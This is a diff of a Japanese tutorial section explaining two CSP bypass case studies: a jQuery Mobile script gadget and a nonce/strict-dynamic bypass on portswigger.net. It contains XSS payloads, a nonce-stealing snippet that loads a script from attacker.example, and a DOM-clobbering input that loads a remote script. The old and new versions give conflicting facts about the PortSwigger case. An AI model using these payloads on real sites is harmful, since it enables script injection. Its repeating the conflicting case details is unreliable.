@@ -1,122 +1,159 @@
 ## CSPバイパス実例（Truesec / PortSwigger nonce）
 
-CSP（Content Security Policy／コンテンツセキュリティポリシー。ブラウザに「このオリジンのスクリプトだけ実行してよい」といった許可リストを伝えるHTTPレスポンスヘッダ）は、反射型・格納型XSSに対する強力な多層防御として広く導入されている。しかし「CSPを設定した＝XSS不可能」ではない。本節では、CSPの理論的な穴ではなく、**実運用で実際に破られた2つの具体的な実例**を通じて、なぜ堅牢に見えるCSPが陥落するのかを仕組みレベルで理解する。
+CSP（Content Security Policy）は「どこから読み込まれたスクリプトなら実行してよいか」をブラウザに指示するHTTPレスポンスヘッダーです。厳格に設定すれば、攻撃者が`<script>`タグをHTMLインジェクションで注入しても、そのスクリプトのソース（`src`属性やインラインコード）がポリシーの許可リストに載っていない限りブラウザは実行を拒否します。
 
-キーワードは「**script gadget（スクリプトガジェット）**」と「**nonce漏洩**」である。どちらも、CSP自体のロジックにバグがあるわけではなく、「CSPが許可した正規のコードを、攻撃者が意図しない用途に流用する」という共通の構造を持つ。
+しかし「CSPが設定されている」ことと「XSSが起きない」ことはイコールではありません。CSPはあくまで**ブラウザが実行時に判定するホワイトリスト機構**であり、ポリシーが許可している既存の正規スクリプト（jQueryなどの一般的なライブラリ、あるいはサイト自身が読み込んでいるJavaScript）の**内部ロジックを乗っ取って攻撃者の狙い通りに動かす**ことができれば、CSP違反を一切起こさずに任意コード実行に到達できます。このテクニックは「スクリプトガジェット（Script Gadgets）」あるいは「コード再利用攻撃（Code-Reuse Attacks）」と呼ばれ、2017年にSebastian Lekies・Krzysztof Kotowicz・Eduardo Vela Nava らがACM CCSで発表した論文「Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets」で体系化されました。
 
-### 4-L-1 script gadget型バイパス：jQuery Mobileの実例（Truesec）
+本節では、この考え方を実例で示すTruesecのブログ記事と、実際にPortSwigger自身のサイトで見つかったnonceベースCSPのバイパス事例を通して、「CSPがあっても壊れる仕組み」を掘り下げます。
 
-#### script gadgetとは何か
+### スクリプトガジェットの基本発想
 
-まず用語を定義する。**script gadget**とは、「攻撃者が直接スクリプトを注入しなくても、ページ上に既に読み込まれている“正規の”JavaScriptコードを、DOM構造やHTML属性の細工だけで“悪用可能な形”に誘導し、結果的に任意コード実行に持ち込む部品」を指す。
+スクリプトガジェットとは、「攻撃者が直接JavaScriptを注入しなくても、既存の正規コードに特定のDOM状態（要素・属性・テキスト）を与えるだけで、そのコードが代わりにJavaScriptを実行してくれる」ような処理のことです。バイナリ解析の世界でいう「ROP（Return-Oriented Programming）ガジェット」のWeb版だと考えると理解しやすいでしょう。攻撃者は新しい命令（コード）を注入するのではなく、既にメモリ（この場合はページ内の正規スクリプト）に存在する命令列を、入力データで無理やり組み合わせて悪用します。
 
-CSPの`script-src`は「どのスクリプトを実行してよいか」を制御するが、あくまで**スクリプトの出所（origin／nonce／hash）**を見ているだけであり、「そのスクリプトが内部で何をするか」までは検査しない。攻撃者がHTMLインジェクション（`<script>`タグやインラインイベントハンドラを使わない、単なるDOM構造の注入。CSPの直接の対象にならない）しかできない状況でも、既にCSPで許可されているライブラリ（jQuery、jQuery Mobile、AngularJS、Vue.jsなど）が「特定のHTML属性や構造を見つけると自動的にコードを実行する」という機能を持っていれば、それを**踏み台（gadget）**として使い、CSPには一切違反せずにスクリプト実行まで到達できる。
+ガジェットは大まかに次のように分類されます。
 
-この概念を体系的に整理し広めたのはSebastian Lekiesらの研究（Google, 2017年 Black Hat/AppSec EU発表）だが、Truesecのブログはこの考え方を、より実践的に**jQuery Mobileという実在のライブラリの脆弱な挙動**に当てはめて解説している点に価値がある。
+- **文字列操作ガジェット**: 属性値やテキストをそのままevalやinnerHTMLに渡してしまう処理
+- **要素構築ガジェット**: ユーザー入力を元にDOM要素を組み立てる際、エスケープが不十分な処理
+- **関数生成ガジェット**: `new Function()`やテンプレートエンジンの式評価器
+- **実行シンク**: 最終的に`eval`・`setTimeout(string)`・`Function`コンストラクタなどJavaScriptとして解釈させる箇所
 
-#### 前提条件
+CSPがブロックするのは「攻撃者が新しく持ち込んだスクリプト」であって、「サイトにもとから存在し許可された正規スクリプトが、汚染されたデータをもとに実行する処理」ではありません。ここに抜け道が生まれます。
 
-この攻撃が成立するための前提は次の通りである。
+### Truesecの実例：jQuery Mobile Popup Widgetを使ったコード再利用攻撃
 
-- サイトのCSPが`script-src`にjQuery Mobile本体（あるいはそれをホストするCDN）を許可している。
-- 攻撃者が使えるのは**HTMLインジェクション**（例えば`innerHTML`へのユーザー入力代入や、サニタイザ通過後のDOM構造操作）のみで、`<script>`タグの直接注入・インラインイベントハンドラ・`javascript:`スキームはCSPやサニタイザによって阻止されている。
-
-#### 仕組み
-
-jQuery Mobileは、ページ内に挿入されたDOM要素を**自動的に「拡張（enhance）」する**設計になっている。具体的には、`data-role`をはじめとする`data-*`属性を持つ要素をライブラリが定期的・イベント駆動的に走査し、その属性値に応じて対応するウィジェットのロジック（ポップアップ表示、ページ遷移、コラプシブルパネルの開閉など）を**自動実行**する。この「属性を見て自動的に処理を行う」仕組み自体はCSP登場以前から存在する便利機能だが、CSP時代においては次のような危険な構造になる。
-
-- 攻撃者は`<script>`を注入できなくても、`data-role="popup"`や`data-transition`といった**属性つきのDOM要素をHTMLインジェクションで挿入**できれば十分。
-- jQuery Mobile側のウィジェット処理コードが、その属性値やリンク先（`href="#id"`によるDOM内フラグメント参照）を**信頼できる設定値として無検証で処理**してしまう経路がある場合、属性値の内容によっては最終的にDOM操作や既存コードパスの誤用を通じて、攻撃者が意図した副作用（別要素の内容やイベントハンドラの実行につながる状態）を引き起こせる。
-- 重要なのは、**このとき実行されているスクリプトはすべて「CSPで許可済みのjQuery Mobile本体」自身**であり、CSPのポリシー評価上は一切違反していないという点である。CSPは「誰が書いたコードか」でしか許可を判定できず、「そのコードが今まさに攻撃者に悪用されているか」は判定できない。これがscript gadget型バイパスの本質的な原理である。
-
-```html
-<!-- 攻撃者がHTMLインジェクションで挿入できるのは <script> を含まない
-     「一見無害な」data-*属性つきのマークアップのみ -->
-<div data-role="popup" id="p1" data-transition="flip">
-  ...attacker-controlled markup...
-</div>
-<a href="#p1" data-rel="popup">click</a>
-```
-> なぜ動くか: `<script>`もインラインハンドラも存在しないため、CSPの`script-src`・`unsafe-inline`禁止のいずれにも抵触しない。しかしCSPで許可済みのjQuery Mobile本体が、この属性つき構造をページロード後に自動走査・自動実行する設計になっているため、DOM構造の注入だけでライブラリの内部ロジックを起動できてしまう。
-
-#### 影響とバージョン
-
-Truesecの記事、および元となったLekiesらの研究では、**jQuery Mobile 1.4.5**（同ライブラリの事実上最後の安定版。2014年10月リリース）が、CSP・XSSフィルタ・DOMPurifyなど複数のミティゲーションを同時にすり抜けられる代表的な脆弱ライブラリとして繰り返し引用されている。jQuery Mobileは2021年に事実上の開発終了（メンテナンス終了）となっており、今後修正パッチが提供される見込みはない。したがって**「許可リストに古いUIライブラリが乗っている」こと自体がCSPの実効性を無効化しうる**、という教訓が重要になる。
-
-#### 防御
-
-- CSPの`script-src`に**バージョンを固定した信頼できるスクリプトのみ**を列挙し、jQuery Mobileのような「DOM走査による自動実行」を行う汎用UIライブラリを許可リストに含める場合は、既知のgadgetがないか個別に検証する。
-- サニタイザ（DOMPurify等）は`<script>`やイベントハンドラ属性の除去だけでなく、**サイトで使用中のライブラリが解釈する独自の`data-*`属性・構造**も踏まえて設計する。
-- 最終的な防御としては、DOM sink（入力が最終的に実行・解釈される危険な代入先。例：`innerHTML`）へのユーザー入力到達そのものを断つのが最も確実であり、CSPはあくまで多層防御の一枚として扱う。
+Truesecのブログ記事は、この「ガジェット」の考え方を具体的なjQuery Mobileの脆弱な処理を使って再現したものです。
 
 > 出典: Bypassing modern XSS mitigations with code-reuse attacks — https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks
-（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約と、関連する一次研究であるSebastian Lekies et al., "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets"（Black Hat USA / AppSec EU, 2017）、および Google製の実証コード集 `google/security-research-pocs`（script-gadgets/bypasses.md）の情報を踏まえて構成した。）
 
----
+#### 前提となるCSP設定
 
-### 4-L-2 nonceベースCSPが「自社サイトで」破られた実例（PortSwigger Research）
+記事で例示されているCSPは次のようなものです。
 
-#### nonceベースCSPの位置づけ
+```
+Content-Security-Policy: script-src 'self' https://code.jquery.com:443 'unsafe-eval'; object-src 'none';
+```
 
-`script-src`をホスト名の許可リスト（allowlist）で書く方式は、許可ドメイン上にJSONPエンドポイントやオープンリダイレクトなど**「間借りできるスクリプト」**が1つでもあればバイパスされやすいことが知られている。そこで近年推奨されているのが**nonce（ノンス。リクエストごとにサーバーが生成するランダムな一回限りのトークン）ベースのCSP**である。
+これは一見厳しく見えます。攻撃者が任意のドメインからスクリプトを読み込むこと（外部の`evil.com/x.js`のようなURL）はブロックされますし、`object-src 'none'`によってFlash等を使ったプラグイン系のバイパスも塞がれています。しかし`https://code.jquery.com`という**CDN経由の正規ライブラリ**が許可リストに載っている点がポイントです。攻撃者はこのjQuery自身（あるいはjQuery Mobile）のコードを「踏み台」として使います。
+
+#### 脆弱な処理：Popup Widgetのid出力
+
+jQuery Mobileには`data-role="popup"`でポップアップUIを生成するウィジェットがあります。このウィジェットは、指定された`id`属性の値を、内部的にHTMLコメントとして書き出す処理を持っていました（ポップアップの一意な識別・後方互換のためのマークアップ生成ロジックの一部です）。ここでの核心的な問題は、`id`属性の値が**エスケープされずにHTMLコメントの内側にそのまま書き込まれる**ことです。
+
+HTMLコメントは`<!--`で始まり`-->`で終わります。攻撃者が`id`属性の値の中に`-->`という文字列を仕込めば、生成されたHTMLの中でコメントがそこで**強制終了**し、それ以降に続けて書いた文字列は通常のHTMLとしてパーサに解釈されます。これは「パーサの再解釈（コンテキストブレイクアウト）」の典型例です。ペイロードは次のようになります。
+
+```html
+<div data-role="popup" id="--!><script>alert(1)</script>"></div>
+```
+
+これをHTMLインジェクション（たとえば反射型XSSの脆弱なパラメータや、掲示板のような場所へのマークアップ注入）で流し込むと、jQuery Mobileのポップアップ初期化コードが`id`属性値をそのままコメント文字列に埋め込みます。結果として生成されるHTML断片は概ね次のような形になります。
+
+```html
+<!-- id: --!><script>alert(1)</script> -->
+```
+
+`-->`の直前に`--`が既にあるため、パーサ的には`id: --` + `!>` の時点でコメントが終了し、続く`<script>alert(1)</script>`が独立したscript要素としてDOMに現れます。ここで挿入されるのはインラインの`<script>`タグですが、これは**攻撃者が最初から用意していたペイロード文字列がjQuery Mobileの正規コードによってDOMに書き込まれた結果**であり、jQuery自体（`code.jquery.com`）はCSPで許可済みのソースとして実行されます。つまりCSPの`script-src`ディレクティブに違反する新規外部スクリプトの読み込みは一切発生せず、既存の許可されたスクリプト（jQuery Mobile本体）が、汚染された`id`値というデータを経由して攻撃者の望むDOM操作（scriptタグの挿入）を代行してくれるわけです。
+
+記事ではさらに前段として、シンプルな`img`要素のonerrorガジェットも紹介されています。
+
+```html
+<img src="n/a" onerror="alert('XSS')"/>
+```
+
+これ自体はCSPが`script-src`でインラインイベントハンドラをブロックしていれば通常は動きません（`unsafe-inline`が無い限りイベントハンドラ属性はCSP違反になります）。Truesecの主張は、こうした素朴なペイロードが弾かれる状況でも、ライブラリの内部ロジックというもう一段深い「実行経路」を使えば、CSPが想定していない形でコードが実行されるということです。
+
+#### 影響を受けたバージョンと位置づけ
+
+記事および関連する2017年のLekiesらの原論文では、検証対象として**jQuery 1.8.3およびjQuery Mobile 1.2.1**が例示されています。より重要なのは個別のバージョンそのものよりも、この研究が調査対象とした**16の広く使われているJavaScriptライブラリのほぼすべてに、複数のスクリプトガジェットが存在した**という事実です。つまり「今使っているライブラリのこのバージョンさえ避ければ安全」という単純な話ではなく、複雑なDOM操作ロジックを持つライブラリ全般に共通するリスクだと理解する必要があります。この種の問題は個別のCVE番号で管理されるというより、「XSSフィルタ／CSP／サニタイザのバイパス手法そのもの」として研究コミュニティに認識されています。
+
+#### 防御策
+
+Truesecが強調する対策は次の3点に集約されます。
+
+1. **根本原因の修正を優先する**: CSPはあくまで多層防御の一枚であり、根本的にはユーザー制御下のデータを挿入先のコンテキスト（HTML本文・属性値・URL・JavaScript文字列など）に応じて正しくエンコード／エスケープすることが必須です。
+2. **secure-by-defaultなフレームワークを使う**: Angularの`trustAsHtml`やReactの`dangerouslySetInnerHTML`のような「危険であることが名前からも分かる」APIを避け、フレームワークが標準で提供する自動エスケープ機構に乗ること。
+3. **CSPを唯一の防御層にしない**: 「CSPはバイパスされうる」という前提に立ち、脆弱性そのものの修正、入力サニタイズ、出力エンコーディングと組み合わせた多層防御を行うこと。
+
+### PortSwiggerの実例：動的解析でnonceベースCSPを崩す
+
+もう一つの実例は、PortSwigger Researchが自社サイト（portswigger.net）で実際に発見した、nonceベースCSPのバイパスです。これは「Burp Scannerの動的解析（Dynamic Analysis）」がどのように実際のCSPバイパスを自動検出したかというケーススタディでもあります。
+
+> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis （公開日: 2021年9月17日）
+
+#### nonceベースCSPが想定している保護
+
+nonceベースCSPとは、ページを描画するたびにサーバー側でランダムな一回限りのトークン（nonce）を生成し、レスポンスヘッダーとHTML中の`<script>`タグの両方に埋め込む方式です。
 
 ```
 Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
 ```
 
-`<script nonce="r4nd0m123">...</script>`のように、レスポンス発行時に埋め込まれた正しいnonce値を持つ`<script>`だけが実行を許される。攻撃者はHTMLインジェクションができても、**レスポンスごとに変わる正しいnonce値を知らない限り**自分のスクリプトタグに正しいnonceを付けられないため、原理的にXSSを実行に持ち込めない――というのが設計上の期待である。
-
-PortSwiggerの研究チームは、この「nonceベースCSPはallowlist型より安全」という通説を検証する過程で、**自社サイトportswigger.net自身**が実際にnonceベースCSPをバイパスされていたことを発見した。これは2023年12月9日にセキュリティ研究者Johan Carlsson（joaxcar）からHackerOne経由で報告された脆弱性（HackerOne報告 #2279346）で、2024年2月に詳細なwriteupが公開されている。
-
-#### `strict-dynamic`が生む伝播的信頼という仕組み
-
-上記のポリシー例にある`'strict-dynamic'`キーワードが本質的に重要である。これは「**正しいnonceを持つ`<script>`が、実行中に動的に生成・挿入した別の`<script>`要素は、たとえその新しい要素にnonceが付いていなくても信頼して実行してよい**」という、CSP仕様上の“信頼の伝播”ルールである（ホスト許可リストを無効化し、その代わりにこの伝播ルールを使う設計）。
-
-これは実務上非常に重要な意味を持つ。**一度でも正規のnonceを持つスクリプトの実行コンテキストを乗っ取れれば（あるいは、有効なnonce値そのものを盗み出せれば）、その後は好きなだけスクリプトタグを動的に生成してDOMに追加でき、`strict-dynamic`のもとではnonceチェックなしに実行される**。つまりnonceベースCSPの安全性は、実質的に「有効なnonce値が外部から一切読み取れないこと」に懸念点が一極集中する。
-
-#### nonce漏洩の経路：DOMプロパティとしてのnonce
-
-ブラウザの仕様では、HTMLソース上の`nonce`属性値は、ページ描画後にセキュリティ上の配慮から**HTML属性としては`getAttribute("nonce")`で読めなくなる（空文字を返す）**ようマスクされる（いわゆるnonce hiding）。しかし同じ値は**DOMのJavaScriptプロパティ`element.nonce`としては引き続き読み取り可能**という非対称な設計になっている。
-
-```js
-document.querySelector('script').nonce // 正しいnonce値が取得できてしまう
-document.querySelector('script').getAttribute('nonce') // "" (マスクされる)
+```html
+<script nonce="r4nd0m123">/* 正規スクリプト */</script>
 ```
-> なぜ動くか: nonce hidingはあくまで「攻撃者がHTMLソースやDOMのシリアライズ結果（`outerHTML`など）を盗み見て値を持ち出す」経路を塞ぐための対策であり、ページ上で**既に実行できているJavaScriptコード**が`.nonce`プロパティに直接アクセスすることまでは防げない。攻撃者がすでに何らかの形でJavaScript実行の糸口（script gadget等）を得ていれば、この一行だけで有効なnonceを取得できる。
 
-PortSwiggerの実例では、この「`.nonce`プロパティ経由でのnonce取得」を、**AngularJSのエラーハンドリング機構を悪用するscript gadget**（4-L-1で解説したものと同種の手法）と組み合わせていた。要点は次の通りである。
+ブラウザは、実行しようとしているスクリプト要素の`nonce`属性値がCSPヘッダーで宣言された値と一致する場合のみ実行を許可します。攻撃者はレスポンスのたびに変わるこのトークンの値を事前に知ることができないため、HTMLインジェクションで`<script>`タグを注入しても、正しい`nonce`値を付与できず実行がブロックされる——というのが設計上の想定です。
 
-1. 攻撃者はサイト内の何らかの箇所にHTMLインジェクション（`<script>`タグを直接使わない、AngularJSに解釈される属性つきマークアップの注入）を成立させる。
-2. その注入されたマークアップがAngularJSのエラーハンドラ経由のgadgetとして機能し、ページ内で**任意のJavaScript式**を評価できる状態になる。
-3. その評価式の中で`document.querySelector('[nonce]').nonce`のようなセレクタを使い、ページ上に存在する正規スクリプトタグの有効なnonce値を取得する。
-4. 取得したnonce値を使って、攻撃者が新しい`<script src="https://attacker.example/payload.js" nonce="盗んだ値">`要素を動的に生成しDOMに追加する。
-5. `strict-dynamic`が有効なため、この新しい要素はホスト許可リストのチェックを受けず、**正しいnonceさえ持っていれば無条件で実行される**。
+さらに`'strict-dynamic'`というキーワードが付与されている場合、挙動が一段複雑になります。これは「nonceで信任されたスクリプトが、実行中に動的に生成・挿入した新しいスクリプト」については、その新しいスクリプト自身にnonceが付いていなくても信頼を引き継いで実行してよい、というルールです。これは正規のSPAフレームワークなどが実行時に`document.createElement('script')`で追加のコードを読み込む挙動を壊さないための救済措置ですが、裏を返せば「**nonceで信任された既存スクリプトの内部ロジックさえ乗っ取れれば、そこから生成される新しいスクリプトはnonceなしで実行できてしまう**」という、CSPにおける典型的なスクリプトガジェットの温床になります。
 
-```js
-// 概念を単純化した攻撃コード（実際のgadgetの起動方法はAngularJSの
-// エラーハンドラ機構に依存するため詳細はwriteup原文を参照）
-const stolenNonce = document.querySelector('[nonce]').nonce;
-const s = document.createElement('script');
-s.src = 'https://attacker.example/payload.js';
-s.nonce = stolenNonce;
-document.head.appendChild(s);
+#### 発見された脆弱なコード
+
+PortSwiggerの記事によれば、Burp Scannerの動的解析エンジンが、あるページ上のJavaScriptで「input要素の値がscriptタグのURLをコントロールしている」パターンを自動的に検出しました。該当する（サイト自身が読み込んでいた）正規のJavaScriptはおおむね次のような処理でした。
+
+```javascript
+var t = document.querySelector("[id^='RecaptchaClientUrl-']").value,
+    i = document.querySelector("[id^='RecaptchaClientSecret-']").value,
+    n = document.createElement("script");
+n.id = "RecaptchaScript";
+n.src = t + i;
 ```
-> なぜ動くか: ブラウザはCSPの`script-src`評価時に、新規挿入された`<script>`要素の`nonce`プロパティを見て、レスポンスヘッダで宣言された値と一致すれば実行を許可する。`strict-dynamic`下ではさらにホスト由来のチェックが免除されるため、正しいnonce値さえ再現できれば任意の外部ペイロードを読み込めてしまう。
 
-#### 「動的解析」が果たした役割
+これはGoogle reCAPTCHA連携用のスクリプトを動的に読み込むための、ごく普通に見えるコードです。`id`が`RecaptchaClientUrl-`から始まる要素の`value`を読み取り、それを新しく作った`<script>`要素の`src`に組み立てて挿入しています。ここでの`querySelector`は、**CSSセレクタにマッチする最初の1要素だけ**を返す仕様であることが決定的な弱点になります。
 
-PortSwigger Researchの記事タイトルが強調する“dynamic analysis（動的解析）”とは、静的なコードレビューやCSPヘッダの文面確認ではなく、**実際にブラウザでページをレンダリングし、DOM上で発生するイベントや関数呼び出しの結果を実行時に観測する検査手法**を指す。今回のケースでは、`document.querySelector`が条件に一致する要素が複数存在するとき常に**「文書順で最初の1要素」だけを返す**という、ごく基本的でありふれたDOM APIの仕様が、思わぬ形で「攻撃者から見て予測可能な正規nonce値の取得口」になっているという、静的な設定確認だけでは気づきにくい類の欠陥を、実行時の挙動観測によって機械的に発見できた点がこの研究の主眼である。
+#### 攻撃：DOM Clobberingでガジェットの入力を乗っ取る
 
-#### 防御策
+もしページ上のどこかに攻撃者がHTMLを注入できる場所（たとえ小さなHTMLインジェクションであっても）があれば、次のような要素を、正規の`RecaptchaClientUrl-...`という`id`を持つ本物の要素より**DOM上で先に**出現するように注入します。
 
-- `strict-dynamic`は非常に強力な代わりに、**nonceの機密性が100%失われた瞬間に防御全体が崩壊する**運用リスクを背負うことを理解した上で採用する。
-- ページ内のどこであれ、**攻撃者が制御できるコンテキストからJavaScriptを1行でも実行できる状態（script gadgetを含む）を残さない**。nonceベースCSPは「XSSを実行させない」対策ではなく「XSSされても被害を限定する」多層防御の一部であり、他のXSS対策（サニタイズ、Trusted Types等）を代替しない。
-- 使用中のフロントエンドフレームワーク（AngularJS、Vue.js等）が持つエラーハンドラや属性解釈系のscript gadgetの有無を、既知の一覧（例：Google `security-research-pocs`のbypasses.md）と照合して点検する。
-- 自動化された動的スキャン（実ブラウザでのレンダリングとDOM挙動観測）を、CSPヘッダの静的検証に加えて定期的に実施する。
+```html
+<input id="RecaptchaClientUrl-" value="//portswigger-labs.net/xss/xss.js">
+```
 
-> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
-（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約に加え、同一の脆弱性について報告者本人が公開した詳細writeup「CSP bypass on PortSwigger.net using Google script resources」（Johan Carlsson／joaxcar.com, 2024年2月19日）、および対応するHackerOne公開報告 #2279346（2023年12月9日報告）の情報を踏まえて構成した。）
+先に説明した正規コードが実行されるとき、`document.querySelector("[id^='RecaptchaClientUrl-']")`はDOM順で最初にマッチした要素、つまり攻撃者が注入したこの`<input>`を返します。結果として`n.src`には攻撃者が完全に制御する外部URL（`//portswigger-labs.net/xss/xss.js`）が代入され、`document.head`などに追加された時点でそのスクリプトが読み込まれ、実行されます。
 
-### まとめ：2つの実例に共通する原理
+ここで見落としてはならないのは、**この`<script>`要素には`nonce`属性が一切付与されていない**という点です。それでもブロックされずに実行されたのは、この`<script>`要素自体が「nonceで信任済みの正規スクリプト（reCAPTCHA連携コード）」によって動的に生成・挿入されたものであり、CSPポリシーに`'strict-dynamic'`が含まれていたためです。`'strict-dynamic'`のルールにより、信任されたスクリプトが生成した子スクリプトは、URLのホワイトリストチェックもnonceチェックも受けずに実行を許可されます。つまりこの攻撃は、
 
-Truesecの事例とPortSwiggerの事例は、表面的には「script gadget」と「nonce漏洩」という別々の技術に見えるが、**CSPが“コードの出所”しか検証できず“実行内容の妥当性”は検証しないという同一の限界**に根ざしている点で本質的に同じ構造を持つ。CSPを設計・運用する際は、「許可リストに載っているコードは安全」と考えるのではなく、「許可リストに載っているコードが攻撃者にとっての踏み台（gadget）になりうるか」「信頼の伝播（`strict-dynamic`やnonceの露出経路）がどこまで及ぶか」を常に併せて検証する必要がある。
+1. HTMLインジェクションで属性を上書きする**DOM Clobbering**（正規コードが参照するはずの要素を、攻撃者が用意した別の要素で「かぶせて」乗っ取るテクニック）と、
+2. `querySelector`が「最初の一致」しか見ないという仕様、
+3. `'strict-dynamic'`が動的生成スクリプトへの信頼を継承する仕様
+
+という3つの要素が組み合わさって成立する、教科書的なスクリプトガジェット攻撃です。攻撃者は一切新しいJavaScriptコードそのものを注入していません。注入したのは単なる`<input>`要素であり、実際に悪意あるスクリプトを`document.head`に挿入して実行したのは、サイト自身が書いた正規のreCAPTCHA連携コードです。
+
+#### 発見手法：Burp Scannerの動的解析
+
+この脆弱性は人間の目視によるコードレビューではなく、**Burp Scannerの動的解析（Dynamic Analysis）**によって自動的にフラグが立てられました。記事の言葉を借りれば「Burp scanner had spotted that the value of an input element was being used to control a script URL」——つまりスキャナーは、ページの実行をブラウザエンジン上で追跡し、「input要素の値がスクリプトのURL生成に流れ込んでいる」というデータフローそのものを検出したということです。これは静的なパターンマッチ（正規表現でペイロード文字列を探す）ではなく、実際にDOM操作の結果を動的に観測して「攻撃者が制御可能な値が、危険なシンク（この場合はscriptのsrc生成）に到達するか」を追跡する手法であり、スクリプトガジェットのようにペイロード自体が単純な入力データにしか見えないケースの発見に強みを持ちます。
+
+#### 修正・教訓
+
+記事が示す推奨修正は非常にシンプルです。
+
+> "The best fix for this issue is to avoid giving an attacker control over the URL, so specifying a static string to the script's location would prevent this issue."（この問題への最良の修正は、攻撃者にURLの制御権を与えないことである。スクリプトの読み込み先を静的な文字列として直接指定すれば、この問題は防止できる。）
+
+つまり、そもそも「DOMから動的に値を読み取ってスクリプトのURLを組み立てる」という設計自体をやめ、スクリプトのURLをコード内にハードコードすべきだった、ということです。PortSwiggerはこの報告を受けてCSP設定・該当コードを修正しました。
+
+この事例が示す教訓は明確です。
+
+- **nonceや`'strict-dynamic'`があっても、正規スクリプトの内部ロジックが「攻撃者が影響できるDOM値」から実行対象を決定していれば、そこがガジェットになる**。
+- **DOM Clobbering（同じidを持つ要素をすり替える、あるいは先に出現させる）は、`querySelector`・`getElementById`のように「最初の一致」を返すAPIと組み合わさると特に危険**。CSPそのものをすり抜けるだけでなく、DOM上の変数参照を書き換えてロジック全体を乗っ取る手段として広く応用が利く。
+- **重要な脆弱性は自動化されたツール（動的解析）によっても発見できる**。ペイロードの見た目が「ただのHTMLインジェクション」であっても、その先に危険なシンクへ到達するデータフローがあるかどうかを実行時に追跡することが有効。
+
+### まとめ：CSPは万能ではない
+
+TruesecとPortSwiggerの2つの実例は、まったく異なるメカニズム（HTMLコメントの脱出 vs DOM Clobbering + strict-dynamic）を使っていますが、共通する本質は同じです。**CSPは「新しく持ち込まれた不正なスクリプト」を防ぐことには強い一方、「もとから許可されている正規スクリプトが、汚染されたデータをもとに危険な処理を代行してしまう」ケースには無力**だということです。これは`unsafe-eval`やインラインスクリプトを禁止するような厳格な設定であっても変わりません。
+
+実務上の教訓として、CSPを導入する際は次の点を意識すべきです。
+
+- ホワイトリストに載せるライブラリやCDNは、それ自体がガジェット（DOM操作を汚染データから行う処理）を持たないか検討する。特にjQuery系・テンプレートエンジン系・古いUIウィジェットライブラリは要注意。
+- `'strict-dynamic'`を使う場合、動的に生成されるスクリプトの`src`やコンテンツが、いかなる経路であってもユーザー制御下のDOM値から組み立てられていないかを確認する。
+- `querySelector`・`getElementById`・`window`のグローバル変数参照など、「複数の要素が同じ名前・IDを持ちうる」箇所は、DOM Clobberingの被害を受けやすい設計になっていないか点検する。
+- CSPはあくまで多層防御の一部と位置づけ、根本的な出力エンコーディングや入力バリデーションを省略しない。
+
+CSPバイパスの発見は年々、こうした「地味なガジェット探し」にシフトしています。ペイロードそのものより、「このサイトにはどんな正規スクリプトが動いていて、それはどんなDOM値を信用しているか」を読み解く力が、CSP環境下でのXSS発見において最も重要なスキルになります。
